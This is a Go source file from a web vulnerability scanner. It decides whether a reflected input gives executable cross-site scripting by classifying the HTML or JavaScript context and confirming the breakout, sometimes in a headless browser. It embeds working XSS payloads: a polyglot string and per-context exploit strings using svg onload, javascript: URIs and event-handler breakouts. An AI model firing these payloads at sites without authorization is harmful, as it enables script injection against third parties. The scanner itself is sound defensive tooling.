package scanner

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	xhtml "golang.org/x/net/html"
)

// Reflected-XSS context analysis + verification (Phase 4/5). The single biggest
// XSS false-positive source is "input was reflected ⇒ XSS". This layer decides,
// deterministically and WITHOUT a browser, whether a reflection is actually
// EXECUTABLE: it injects a marker followed by the key breakout characters
// ('"<>) and checks (a) WHERE the marker landed (HTML text / quoted attr /
// unquoted attr / JS string / JSON / URL / CSS) and (b) whether those breakout
// characters survived UNENCODED in that context.
//
//   reflected & encoded            → REJECTED  (safe output encoding)
//   reflected raw in exec context  → VERIFIED  (records context + surviving chars)
//   reflected but ambiguous / none → INCONCLUSIVE

// XSS reflection contexts.
const (
	CtxNone         = "none"
	CtxHTMLText     = "html_text"
	CtxQuotedAttr   = "quoted_attribute"
	CtxUnquotedAttr = "unquoted_attribute"
	CtxEventHandler = "event_handler"
	CtxJSString     = "js_string"
	CtxJSExpr       = "js_expression"
	CtxJSON         = "json"
	CtxURL          = "url"
	CtxCSS          = "css"
	CtxComment      = "html_comment"
	CtxRCDATA       = "rcdata" // inside <textarea>/<title>/<noscript>… raw-text
)

// xssProbe is a unique marker followed by the four key breakout characters.
const xssMarker = "rcnx9k7"
const xssProbe = xssMarker + `'"<>`
const xssProbeSuffix = `'"<>` + "`\\/();= \t"

func xssProbeFor(marker string) string { return marker + xssProbeSuffix }

// ReflectionAnalysis is the result of analysing where/how a probe reflected.
type ReflectionAnalysis struct {
	Reflected  bool
	Context    string
	Surviving  string // which of ' " < > survived UNENCODED
	Decoded    string // encoded bytes the HTML tokenizer decodes inside attributes
	Executable bool
	Encoded    bool
	Quote      byte   // the attribute quote char (' or ") when in an attribute, else 0
	JSQuote    byte   // open JS string quote for script/event-handler contexts
	AttrName   string // current HTML attribute name, when applicable
	TagName    string // current HTML element name, when in an opening tag
	URLScheme  bool   // reflection controls the beginning of a javascript:-capable URL value
	CloseTag   string // for CtxRCDATA: the close tag needed to break out (e.g. </textarea>)
}

// rcdataElements are raw-text/RCDATA elements whose content is NOT parsed as
// markup: a reflection inside one is inert until its close tag breaks out. Search
// terms echoed into <title> and <textarea> are a very common real XSS sink.
var rcdataElements = []string{"textarea", "title", "noscript", "xmp", "noembed", "iframe"}

// AnalyzeReflection inspects a response body for the injected probe. Input is
// frequently echoed in MORE THAN ONE place — e.g. HTML-encoded in the page title
// but raw inside an attribute, or safe in one <div> and executable in a <script>.
// Analysing only the first occurrence (the historical behaviour) silently missed
// the executable one. This scans EVERY occurrence and returns the strongest
// verdict (an executable reflection beats a raw-but-unproven one beats an encoded
// one), so a single exploitable sink anywhere is enough.
func AnalyzeReflection(body string) ReflectionAnalysis {
	return AnalyzeReflectionWithMarker(body, xssMarker)
}

// AnalyzeReflectionWithMarker is the collision-safe production variant. A fresh
// marker per request prevents a literal marker already present in the page or a
// cached response from being mistaken for reflection.
func AnalyzeReflectionWithMarker(body, marker string) ReflectionAnalysis {
	return analyzeReflectionProbe(body, marker, `'"<>`)
}

func analyzeReflectionProbe(body, marker, suffix string) ReflectionAnalysis {
	best := ReflectionAnalysis{Context: CtxNone}
	if marker == "" {
		return best
	}
	for off := 0; ; {
		rel := strings.Index(body[off:], marker)
		if rel < 0 {
			break
		}
		idx := off + rel
		off = idx + len(marker)
		a := analyzeReflectionAt(body, idx, marker, suffix)
		if reflectionStronger(a, best) {
			best = a
		}
		if best.Executable {
			break // can't do better than a provably-executable reflection
		}
	}
	return best
}

// reflectionRank orders reflections by exploit value: executable > raw (breakout
// chars survived but context unproven) > merely reflected/encoded.
func reflectionRank(a ReflectionAnalysis) int {
	switch {
	case a.Executable:
		return 3
	case a.Reflected && a.Surviving != "" && !a.Encoded:
		return 2
	case a.Reflected:
		return 1
	default:
		return 0
	}
}

func reflectionStronger(a, b ReflectionAnalysis) bool { return reflectionRank(a) > reflectionRank(b) }

// analyzeReflectionAt analyses ONE occurrence of the marker at body[idx:].
func analyzeReflectionAt(body string, idx int, marker, suffix string) ReflectionAnalysis {
	a := ReflectionAnalysis{Context: CtxNone, Reflected: true}

	// Parse the reflected diagnostic suffix IN ORDER. Searching an arbitrary tail
	// for '<'/'>' is unsafe: it mistakes the page's own closing tag after an encoded
	// reflection for a raw attacker-controlled '<'. Ordered parsing attributes only
	// bytes that correspond to the exact characters we sent.
	after := body[idx+len(marker):]
	a.Surviving, a.Decoded, a.Encoded = parseReflectedSuffix(after, suffix)

	d := classifyContextDetails(body[:idx])
	a.Context, a.Quote, a.CloseTag = d.kind, d.quote, d.closeTag
	a.JSQuote, a.AttrName, a.TagName = d.jsQuote, d.attrName, d.tagName
	a.URLScheme = d.kind == CtxURL && d.valueStart && javascriptURLCapable(d.tagName, d.attrName)

	// Executable = it landed somewhere markup/script-relevant AND the breakout
	// character that context needs survived raw. Every VERIFIED verdict below is a
	// browserless-provable breakout (the exact byte that escapes the context).
	switch a.Context {
	case CtxHTMLText:
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	case CtxQuotedAttr:
		// Break the ACTUAL opening quote (single or double) → close the tag → new
		// element/event. Checking a fixed '"' missed every single-quoted attribute.
		q := string(rune(a.Quote))
		if a.Quote == 0 {
			q = `"`
		}
		a.Executable = strings.Contains(a.Surviving, q)
	case CtxURL:
		q := string(rune(a.Quote))
		if a.Quote == 0 {
			q = `"`
		}
		a.Executable = strings.Contains(a.Surviving, q) || a.URLScheme
	case CtxUnquotedAttr:
		// Either close the current tag or start a new event attribute with space.
		a.Executable = strings.Contains(a.Surviving, ">") || strings.Contains(a.Surviving, " ") || strings.Contains(a.Surviving, "\t")
	case CtxEventHandler:
		// Event-handler attributes are nested JS contexts. Breaking the HTML quote
		// OR the inner JS quote/expression is sufficient and must be browser-proven.
		a.Executable = (a.Quote != 0 && strings.Contains(a.Surviving, string(a.Quote))) ||
			(a.JSQuote != 0 && (strings.Contains(a.Surviving, string(a.JSQuote)) || strings.Contains(a.Decoded, string(a.JSQuote)))) ||
			(a.JSQuote == 0 && (strings.Contains(a.Surviving, ";") || strings.Contains(a.Surviving, "(")))
	case CtxJSString:
		a.Executable = (a.JSQuote != 0 && strings.Contains(a.Surviving, string(a.JSQuote))) ||
			(strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">"))
	case CtxJSExpr:
		a.Executable = true
	case CtxCSS:
		// Inside <style>: closing it (</style>) needs < and > to survive, then a
		// fresh element executes. A raw style value alone no longer executes.
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	case CtxComment, CtxRCDATA:
		// Break out of the comment (-->) or raw-text element (</textarea>) into HTML
		// text; both require the angle brackets to survive UNENCODED to form the
		// breakout sequence and a fresh element.
		a.Executable = strings.Contains(a.Surviving, "<") && strings.Contains(a.Surviving, ">")
	}
	// Mixed encoding is common: one irrelevant character may be encoded while the
	// exact character needed by this context survives. Executability is therefore
	// decided per required character above, never by a blanket Encoded veto.
	return a
}

func parseReflectedSuffix(after, expected string) (surviving, decoded string, encoded bool) {
	if len(after) > 512 {
		after = after[:512]
	}
	pos := 0
	for i := 0; i < len(expected); i++ {
		ch := expected[i]
		if pos < len(after) && after[pos] == ch {
			surviving += string(ch)
			pos++
			continue
		}
		matched := ""
		for _, enc := range encodedForms(ch) {
			if strings.HasPrefix(strings.ToLower(after[pos:]), strings.ToLower(enc)) {
				matched = enc
				break
			}
		}
		if matched != "" {
			encoded = true
			decoded += string(ch)
			pos += len(matched)
		}
		// If the character was stripped, do not advance: the next expected
		// character may be the byte currently at pos.
	}
	return surviving, decoded, encoded
}

func encodedForms(ch byte) []string {
	switch ch {
	case '\'':
		return []string{"&#39;", "&#039;", "&#x27;", "&apos;", "%27", `\'`, `\u0027`}
	case '"':
		return []string{"&quot;", "&#34;", "&#034;", "&#x22;", "%22", `\"`, `\u0022`}
	case '<':
		return []string{"&lt;", "&#60;", "&#060;", "&#x3c;", "%3c", `\x3c`, `\u003c`}
	case '>':
		return []string{"&gt;", "&#62;", "&#062;", "&#x3e;", "%3e", `\x3e`, `\u003e`}
	case '`':
		return []string{"&#96;", "&#x60;", "%60", `\u0060`}
	case '\\':
		return []string{`\\`, `%5c`, `\u005c`}
	case ' ':
		return []string{"%20", "+", "&#32;", "&#x20;"}
	case '\t':
		return []string{"%09", "&#9;", "&#x9;"}
	default:
		return []string{"%" + fmt.Sprintf("%02x", ch)}
	}
}

// nosniffNote appends a mention of the nosniff header when present, so the
// rejection reason names both facts a triager needs (declared type + nosniff).
func nosniffNote(nosniff bool) string {
	if nosniff {
		return " with X-Content-Type-Options: nosniff"
	}
	return ""
}

// urlAttrs are attributes whose value is a URL: a reflection at the SCHEME of one
// of these is a javascript:-URI sink, and breaking its quote is an HTML breakout.
var urlAttrs = map[string]bool{
	"href": true, "src": true, "action": true, "formaction": true,
	"data": true, "poster": true, "background": true, "cite": true,
	"longdesc": true, "xlink:href": true, "srcset": true, "ping": true,
}

// classifyContext determines the context from the text PRECEDING the marker, the
// (attribute) quote char, and (for RCDATA) the close tag needed to break out.
type reflectionContextDetails struct {
	kind, closeTag, attrName, tagName string
	quote, jsQuote                    byte
	valueStart                        bool
}

func classifyContext(before string) (string, byte, string) {
	d := classifyContextDetails(before)
	return d.kind, d.quote, d.closeTag
}

func classifyContextDetails(before string) reflectionContextDetails {
	low := strings.ToLower(before)
	// inside an HTML comment? <!-- … [here] with no --> after the last <!--.
	if lc := strings.LastIndex(before, "<!--"); lc >= 0 && lc > strings.LastIndex(before, "-->") {
		return reflectionContextDetails{kind: CtxComment}
	}
	// inside a <script> block?
	lastScript := strings.LastIndex(low, "<script")
	lastScriptEnd := strings.LastIndex(low, "</script")
	if lastScript > lastScriptEnd {
		// If the opening <script ...> tag itself is not closed yet, the marker is
		// in an HTML attribute, not JavaScript source.
		tagEnd := strings.IndexByte(before[lastScript:], '>')
		if tagEnd < 0 {
			return classifyOpenTag(before[lastScript:])
		}
		// inside JS. string if an odd number of unescaped quotes precede us.
		seg := before[lastScript+tagEnd+1:]
		if q := openJSQuote(seg); q != 0 {
			return reflectionContextDetails{kind: CtxJSString, jsQuote: q}
		}
		return reflectionContextDetails{kind: CtxJSExpr}
	}
	// inside a <style> block?
	lastStyle := strings.LastIndex(low, "<style")
	lastStyleEnd := strings.LastIndex(low, "</style")
	if lastStyle > lastStyleEnd {
		return reflectionContextDetails{kind: CtxCSS}
	}
	// inside a raw-text/RCDATA element (<textarea>/<title>/…)? Innermost wins.
	if ctxName, closeTag, ok := rcdataContext(before, low); ok {
		_ = ctxName
		return reflectionContextDetails{kind: CtxRCDATA, closeTag: closeTag}
	}
	// inside an open tag (attribute area)? find last '<' vs last '>'
	lt := strings.LastIndex(before, "<")
	gt := strings.LastIndex(before, ">")
	if lt > gt {
		return classifyOpenTag(before[lt:])
	}
	return reflectionContextDetails{kind: CtxHTMLText}
}

func classifyOpenTag(tag string) reflectionContextDetails {
	// Tokenize the unfinished opening tag up to the marker. LastIndex("=") is
	// incorrect when an earlier attribute value itself contains '=' or quotes.
	i := 0
	for i < len(tag) && (tag[i] == '<' || tag[i] == '/' || isHTMLSpace(tag[i])) {
		i++
	}
	start := i
	for i < len(tag) && !isHTMLSpace(tag[i]) && tag[i] != '>' && tag[i] != '/' {
		i++
	}
	tagName := strings.ToLower(tag[start:i])
	var attrName, value string
	var quote byte
	state := "before-attr"
	for i < len(tag) {
		c := tag[i]
		switch state {
		case "before-attr":
			if isHTMLSpace(c) || c == '/' {
				i++
				continue
			}
			if c == '>' {
				i++
				continue
			}
			attrName, value, quote = "", "", 0
			state = "attr-name"
		case "attr-name":
			if c == '=' {
				attrName = strings.ToLower(strings.TrimSpace(attrName))
				state = "before-value"
				i++
				continue
			}
			if isHTMLSpace(c) {
				attrName = strings.ToLower(strings.TrimSpace(attrName))
				state = "after-name"
				i++
				continue
			}
			if c == '>' {
				state = "before-attr"
				i++
				continue
			}
			attrName += string(c)
			i++
		case "after-name":
			if isHTMLSpace(c) {
				i++
				continue
			}
			if c == '=' {
				state = "before-value"
				i++
				continue
			}
			state = "before-attr"
		case "before-value":
			if isHTMLSpace(c) {
				i++
				continue
			}
			if c == '\'' || c == '"' {
				quote = c
				state = "quoted-value"
				i++
				continue
			}
			state = "unquoted-value"
		case "quoted-value":
			if c == quote {
				state = "before-attr"
				i++
				continue
			}
			value += string(c)
			i++
		case "unquoted-value":
			if isHTMLSpace(c) || c == '>' {
				state = "before-attr"
				i++
				continue
			}
			value += string(c)
			i++
		}
	}
	if state == "before-attr" || state == "attr-name" || state == "after-name" {
		return reflectionContextDetails{kind: CtxUnquotedAttr, tagName: tagName, attrName: attrName}
	}
	d := reflectionContextDetails{quote: quote, attrName: attrName, tagName: tagName, valueStart: strings.TrimSpace(value) == ""}
	if strings.HasPrefix(attrName, "on") {
		d.kind, d.jsQuote = CtxEventHandler, openJSQuote(value)
		return d
	}
	if urlAttrs[attrName] {
		d.kind = CtxURL
		return d
	}
	if quote != 0 {
		d.kind = CtxQuotedAttr
	} else {
		d.kind = CtxUnquotedAttr
	}
	return d
}

func isHTMLSpace(c byte) bool { return c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f' }

func javascriptURLCapable(tagName, attrName string) bool {
	switch attrName {
	case "href", "xlink:href", "action", "formaction":
		return true
	case "src":
		return tagName == "iframe" || tagName == "script"
	case "data":
		return tagName == "object"
	}
	return false
}

// rcdataContext reports whether the marker sits inside the raw-text content of an
// RCDATA/RAWTEXT element (not its open-tag attributes), and returns the close tag
// that breaks out. It picks the INNERMOST such element still open before the marker.
func rcdataContext(before, low string) (ctxName, closeTag string, ok bool) {
	bestOpen := -1
	for _, el := range rcdataElements {
		o := strings.LastIndex(low, "<"+el)
		if o < 0 || o <= bestOpen {
			continue
		}
		// must be past the element's own open-tag '>' (i.e. in its content),
		// and not already closed by a matching </el> after that.
		tagEnd := strings.IndexByte(low[o:], '>')
		if tagEnd < 0 {
			continue // still inside the open tag's attributes → not RCDATA content
		}
		contentStart := o + tagEnd + 1
		if strings.Contains(low[contentStart:], "</"+el) {
			continue // element already closed before the marker
		}
		bestOpen = o
		ctxName, closeTag, ok = el, "</"+el+">", true
	}
	return ctxName, closeTag, ok
}

// attrNameBeforeEq extracts the (lower-cased) attribute name immediately before
// the '=' at position eq within an open-tag fragment.
func attrNameBeforeEq(tag string, eq int) string {
	i := eq - 1
	for i >= 0 && (tag[i] == ' ' || tag[i] == '\t' || tag[i] == '\n' || tag[i] == '\r') {
		i--
	}
	end := i + 1
	for i >= 0 {
		c := tag[i]
		if c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '<' || c == '"' || c == '\'' {
			break
		}
		i--
	}
	return strings.ToLower(tag[i+1 : end])
}

// inQuotedString reports whether the segment ends inside an open JS string.
func inQuotedString(seg string) bool {
	return openJSQuote(seg) != 0
}

func openJSQuote(seg string) byte {
	var q byte
	lineComment, blockComment := false, false
	for i := 0; i < len(seg); i++ {
		c := seg[i]
		if lineComment {
			if c == '\n' || c == '\r' {
				lineComment = false
			}
			continue
		}
		if blockComment {
			if c == '*' && i+1 < len(seg) && seg[i+1] == '/' {
				blockComment = false
				i++
			}
			continue
		}
		if q == 0 && c == '/' && i+1 < len(seg) {
			switch seg[i+1] {
			case '/':
				lineComment = true
				i++
				continue
			case '*':
				blockComment = true
				i++
				continue
			}
		}
		if q != 0 && c == '\\' {
			i++
			continue
		}
		if q == 0 && (c == '\'' || c == '"' || c == '`') {
			q = c
		} else if c == q {
			q = 0
		}
	}
	return q
}

// XSSContextVerifier proves reflected XSS by context analysis. Reuses Replay
// (shared client + optional identity headers) — no second HTTP engine.
type XSSContextVerifier struct {
	identity *Identity // optional (authenticated reflection)
}

func NewXSSContextVerifier(id *Identity) *XSSContextVerifier {
	return &XSSContextVerifier{identity: id}
}

func (v *XSSContextVerifier) Name() string { return "xss-context" }

func (v *XSSContextVerifier) CanVerify(c VulnerabilityCandidate) bool {
	return c.Type == "xss" && (c.Subtype == "" || c.Subtype == "reflected")
}

// Verify first runs the fast, deterministic browserless analysis; if that does
// not already PROVE the XSS, it escalates to a real headless browser (when one is
// available) that renders the page and confirms actual payload execution. The
// browser pass is what catches modern client-rendered / SPA reflections and
// JS-context execution the browserless parser cannot prove.
func (v *XSSContextVerifier) Verify(ctx context.Context, c VulnerabilityCandidate) VerifyResult {
	res := v.verifyBrowserless(ctx, c)
	if res.Verdict == VerifyVerified {
		return res
	}
	// Escalate everything the browserless pass did not prove — including the
	// "not reflected in the raw HTML" case, which is exactly how a client-rendered
	// SPA looks (the reflection is injected into the DOM by JS after load).
	if b := getXSSBrowser(); b != nil {
		ip := candidateInsertionPoint(c)
		if res.Method == "xss-script-resource" {
			if pl, ok := b.ConfirmScriptResource(ctx, ip, identityHeaders(v.identity)); ok {
				return VerifyResult{
					Verdict: VerifyVerified, Confidence: 99, Method: "xss-script-resource-browser",
					Evidence: "reflected XSS PROVEN by loading the injected endpoint as an external JavaScript resource; the payload executed and set the browser nonce. Executable payload: " + pl,
				}
			}
		}
		if pl, ok := b.ConfirmInsertion(ctx, ip, identityHeaders(v.identity)); ok {
			return VerifyResult{
				Verdict:    VerifyVerified,
				Confidence: 99,
				Method:     "xss-browser",
				Evidence:   "reflected XSS PROVEN in a real headless browser: the injected JavaScript changed document.title to a random nonce after the page rendered. Reflection alone cannot produce this proof. This works for client-rendered and SPA pages; the reported PoC is the alert(document.domain) equivalent. Executable payload: " + pl,
			}
		}
	}
	return res
}

func (v *XSSContextVerifier) verifyBrowserless(ctx context.Context, c VulnerabilityCandidate) VerifyResult {
	if c.Parameter == "" || c.URL == "" {
		return VerifyResult{Verdict: VerifyInconclusive, Reason: "could not place probe in parameter", Method: "xss-context"}
	}
	ip := candidateInsertionPoint(c)
	auth := identityHeaders(v.identity)
	marker := newXSSToken("rcnctx")
	r := sendInjectedResponse(ctx, dastClient, ip, xssProbeFor(marker), auth)
	// WAF/block-page gate: if the probe was met by a WAF block/challenge page, any
	// "reflection" is the WAF echoing our payload into its own block template, not
	// the app rendering it — it never executes. Reject so a dalfox/nuclei reflection
	// hit against a blocked endpoint is not promoted to a false finding.
	if looksLikeBlockPage(r.Status, r.Body) {
		return VerifyResult{Verdict: VerifyInconclusive, Confidence: ConfCandidateLo, Method: "xss-context",
			Reason: fmt.Sprintf("request was answered by a WAF/edge block or challenge page (HTTP %d) — the reflected value is echoed by the WAF, not rendered by the app, so it does not execute", r.Status)}
	}
	a := analyzeReflectionProbe(r.Body, marker, xssProbeSuffix)
	// Content-Type gate: a reflected payload only executes when the browser renders
	// the response as an HTML document. Input echoed into application/json (or any
	// declared non-HTML type) — even with the breakout chars '"<> surviving raw —
	// is inert on direct navigation, and X-Content-Type-Options: nosniff makes that
	// non-negotiable. This is THE dominant reflected-XSS false positive: an API
	// endpoint reflecting a parameter into its JSON body (e.g. ably.com's
	// clientId → {"clientId":"…"} with nosniff). Without this gate the body-only
	// analysis mistakes a JSON reflection for HTML-text context (JSON does not
	// encode < or >) and wrongly promotes it to VERIFIED.
	htmlSink := browserRendersResponse(r.Status, r.ContentType, r.Body, r.NoSniff)
	if a.Reflected && !htmlSink && scriptLikeContentType(r.ContentType) {
		return VerifyResult{Verdict: VerifyInconclusive, Confidence: ConfCandidateLo,
			Method: "xss-script-resource",
			Reason: "input is reflected in a JavaScript/JSONP resource; it must be loaded as an external script in a real browser to prove execution"}
	}
	switch {
	case !a.Reflected:
		return VerifyResult{Verdict: VerifyInconclusive, Reason: "probe not reflected at this parameter", Method: "xss-context"}
	case a.Encoded && !a.Executable:
		return VerifyResult{Verdict: VerifyRejected, Confidence: 0,
			Reason: "input is reflected but safely HTML-encoded in " + a.Context + " context — not executable", Method: "xss-context"}
	case !a.Executable:
		return VerifyResult{Verdict: VerifyInconclusive,
			Reason: "reflected in " + a.Context + " but breakout characters did not survive raw — cannot prove execution", Method: "xss-context"}
	case !htmlSink:
		return VerifyResult{Verdict: VerifyRejected, Confidence: 0,
			Reason: "input is reflected with breakout chars surviving, but the response is " + ctLabel(r.ContentType) +
				nosniffNote(r.NoSniff) + " — a browser will not render it as HTML, so it does not execute (reflected XSS requires an HTML-rendered response)",
			Method: "xss-context"}
	}

	// EXECUTION CONFIRM — the char-survival analysis above is necessary but NOT
	// sufficient: surviving '<' '>' can still be neutralised by the surrounding
	// markup, so "reflected" is not "executable". This second stage injects a
	// BENIGN marker ELEMENT with the context-appropriate breakout and requires it
	// to materialise as a GENUINE start tag in an HTML-rendered response — the same
	// browserless, deterministic proof the active DAST engine uses. Only THEN is
	// the XSS verified. This is what kills the dominant reflected-XSS false
	// positive (a nuclei/dalfox reflection hit that never actually forms a tag): a
	// payload that does not become a live element is rejected, so a real finding
	// means the marker element truly sits in the page and would execute.
	payload, needle, confirmable := dastConfirm(a)
	if !confirmable {
		payload, needle, confirmable = jsScriptBreakout(a)
	}
	if !confirmable {
		return VerifyResult{Verdict: VerifyInconclusive, Method: "xss-context",
			Reason: "executable-looking reflection in " + a.Context + " context, but no deterministic browserless breakout applies (needs runtime/DOM proof)"}
	}
	baseR := sendInjectedResponse(ctx, dastClient, ip, newXSSToken("rcnbase"), auth)
	confR := sendInjectedResponse(ctx, dastClient, ip, payload, auth)
	if browserRendersResponse(confR.Status, confR.ContentType, confR.Body, confR.NoSniff) &&
		htmlTagInjected(confR.Body, dastElement) && !strings.Contains(baseR.Body, needle) {
		// HTML injection is not yet JavaScript execution. Require one exact
		// executing vector to survive as live markup under an inline-permitting CSP;
		// otherwise leave it for the Chromium phase rather than over-confirming.
		for _, p := range buildExecPayloads(a) {
			execR := sendInjectedResponse(ctx, dastClient, ip, p.Payload, auth)
			if browserRendersResponse(execR.Status, execR.ContentType, execR.Body, execR.NoSniff) &&
				cspAllowsInlineScript(execR.CSP) && execPayloadSurvived(execR.Body, p) {
				ev := "reflected XSS PROVEN in " + a.Context + " context: the context-specific breakout formed live executable markup and the exact handler/script survived unencoded. Executable payload: " +
					p.Payload + " | context-agnostic polyglot: " + xssPolyglot
				return VerifyResult{Verdict: VerifyVerified, Confidence: 95, Evidence: ev, Method: "xss-context"}
			}
		}
		return VerifyResult{Verdict: VerifyInconclusive, Confidence: ConfCandidateLo, Method: "xss-context",
			Reason: "HTML breakout formed a live element, but no tested executable vector survived CSP/filtering; runtime browser proof required"}
	}
	return VerifyResult{Verdict: VerifyRejected, Confidence: 0, Method: "xss-context",
		Reason: "input is reflected in " + a.Context + " context but the injected marker element did NOT form a live HTML tag (neutralised by the surrounding markup / re-encoded on the confirm request) — not executable, so not a real XSS"}
}

func candidateInsertionPoint(c VulnerabilityCandidate) insertionPoint {
	ip := insertionPoint{URL: c.URL, Param: c.Parameter, Method: c.Method, Location: c.Location}
	if ip.Method == "" {
		ip.Method = "GET"
	}
	switch strings.ToLower(c.Location) {
	case "json":
		ip.ContentType = "application/json"
	case "body", "form":
		ip.ContentType = "application/x-www-form-urlencoded"
	}
	return ip
}

func identityHeaders(id *Identity) map[string]string {
	out := map[string]string{}
	if id == nil {
		return out
	}
	for k, value := range id.Headers {
		out[k] = value
	}
	if id.UserAgent != "" {
		out["User-Agent"] = id.UserAgent
	}
	return out
}

// xssPolyglot is a single context-breaking payload (adapted from 0xsobky /
// Gareth Heyes' well-known polyglots) that fires across HTML-text, quoted/unquoted
// attribute, comment, and several JS-string contexts at once. Reported alongside
// the context-specific exploit so a triager has one string that works even when
// the exact surrounding context is uncertain.
const xssPolyglot = `jaVasCript:/*-/*` + "`" + `/*` + "`" + `/*'/*"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.domain)//>\x3e`

// contextPayload returns an example executable payload per context (for evidence).
// These are real, minimal exploits — not fixed to alert(1): they use
// alert(document.domain) so a triager instantly sees WHICH origin executed.
func contextPayload(ctxName string) string {
	switch ctxName {
	case CtxHTMLText:
		// <svg onload> is shorter than <script> and fires without a network fetch;
		// <img src=x onerror> is the classic fallback where svg is filtered.
		return `<svg onload=alert(document.domain)>`
	case CtxQuotedAttr:
		// Break the quote, close the tag, then a fresh auto-firing element.
		return `"><svg onload=alert(document.domain)>`
	case CtxUnquotedAttr:
		// No quote to break: a leading space starts a new attribute; autofocus makes
		// onfocus fire with no user interaction. Works where onmouseover would not.
		return ` autofocus onfocus=alert(document.domain) x=`
	case CtxEventHandler:
		return `';alert(document.domain);//`
	case CtxJSString:
		// Close the string, terminate the statement, run code, comment out the rest.
		// If < and > survive, </script><svg onload=…> is the more reliable variant.
		return `';alert(document.domain)//`
	case CtxJSExpr:
		return `alert(document.domain)`
	case CtxURL:
		// href/src sink: javascript: URIs execute on click/navigation.
		return `javascript:alert(document.domain)`
	case CtxCSS:
		// Modern browsers dropped expression()/-moz-binding, so a raw <style> value
		// rarely executes on its own — break out of the style block entirely.
		return `</style><svg onload=alert(document.domain)>`
	case CtxComment:
		// Close the comment, then a fresh auto-firing element.
		return `--><svg onload=alert(document.domain)>`
	case CtxRCDATA:
		// Close the raw-text element (title/textarea/…), then a fresh element.
		return `</textarea></title><svg onload=alert(document.domain)>`
	default:
		return `<svg onload=alert(document.domain)>`
	}
}

// injectProbe places the xssProbe into a query parameter of rawURL using the
// shared minimal-escaping primitive (injectParam) — the same builder the active
// DAST engine uses. url.Values.Encode() would re-encode every SIBLING parameter
// (double-encoding any already-percent-encoded value) and reorder the query;
// injectParam touches only the target parameter, so the probe reaches the server
// byte-for-byte and no unrelated value is corrupted.
func injectProbe(rawURL, param string) (string, bool) {
	if param == "" {
		return "", false
	}
	if _, err := url.Parse(rawURL); err != nil {
		return "", false
	}
	return injectParam(rawURL, param, xssProbe), true
}

// htmlTagInjected uses the same HTML5 parser model as a browser. The old custom
// scanner could misread tags after a '>' inside comments and did not implement
// all RAWTEXT/RCDATA states, creating both false positives and misses.
func htmlTagInjected(body, name string) bool {
	doc, err := xhtml.Parse(strings.NewReader(body))
	if err != nil {
		return false
	}
	name = strings.ToLower(strings.TrimSpace(name))
	var walk func(*xhtml.Node) bool
	walk = func(n *xhtml.Node) bool {
		if n.Type == xhtml.ElementNode && strings.EqualFold(n.Data, name) {
			return true
		}
		for ch := n.FirstChild; ch != nil; ch = ch.NextSibling {
			if walk(ch) {
				return true
			}
		}
		return false
	}
	return walk(doc)
}
